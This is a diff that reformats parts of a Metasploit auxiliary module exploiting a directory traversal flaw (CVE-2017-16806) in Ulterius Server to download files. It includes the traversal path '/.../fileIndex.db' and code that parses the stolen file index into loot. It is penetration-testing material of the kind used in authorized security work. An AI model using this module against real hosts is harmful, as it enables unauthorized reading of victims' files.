@@ -7,46 +7,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Ulterius Server File Download Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in Ulterius Server < v1.9.5.0
-        to download files from the affected host. A valid file path is needed to download a file.
-        Fortunately, Ulterius indexes every file on the system, which can be stored in the
-        following location:
+    super(
+      update_info(
+        info,
+        'Name' => 'Ulterius Server File Download Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in Ulterius Server < v1.9.5.0
+          to download files from the affected host. A valid file path is needed to download a file.
+          Fortunately, Ulterius indexes every file on the system, which can be stored in the
+          following location:
 
           http://ulteriusURL:port/.../fileIndex.db.
 
-        This module can download and parse the fileIndex.db file. There is also an option to
-        download a file using a provided path.
-      },
-      'Author'         =>
-        [
-          'Rick Osgood',   # Vulnerability discovery and PoC
-          'Jacob Robles'   # Metasploit module
+          This module can download and parse the fileIndex.db file. There is also an option to
+          download a file using a provided path.
+        },
+        'Author' => [
+          'Rick Osgood', # Vulnerability discovery and PoC
+          'Jacob Robles' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'EDB', '43141' ],
           [ 'CVE', '2017-16806' ]
-        ]))
+        ]
+      )
+    )
 
-      register_options(
-        [
-          Opt::RPORT(22006),
-          OptString.new('PATH', [true, 'Path to the file to download', '/.../fileIndex.db']),
-        ])
+    register_options(
+      [
+        Opt::RPORT(22006),
+        OptString.new('PATH', [true, 'Path to the file to download', '/.../fileIndex.db']),
+      ]
+    )
   end
 
   def process_data(index, parse_data)
     length = parse_data[index].unpack('C')[0]
-    length += parse_data[index+1].unpack('C')[0]
-    length += parse_data[index+2].unpack('C')[0]
-    length += parse_data[index+3].unpack('C')[0]
+    length += parse_data[index + 1].unpack('C')[0]
+    length += parse_data[index + 2].unpack('C')[0]
+    length += parse_data[index + 3].unpack('C')[0]
 
     index += 4
-    filename = parse_data[index...index+length]
+    filename = parse_data[index...index + length]
     index += length
     return index, filename
   end
@@ -65,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
       index, directory = process_data(index, parse_data)
       remote_files << directory + '\\' + filename + "\n"
 
-      #skip FFFFFFFFFFFFFFFF
+      # skip FFFFFFFFFFFFFFFF
       index += 8
     end
     myloot = store_loot('ulterius.fileIndex.db', 'text/plain', datastore['RHOST'], remote_files, 'fileIndex.db', 'Remote file system')
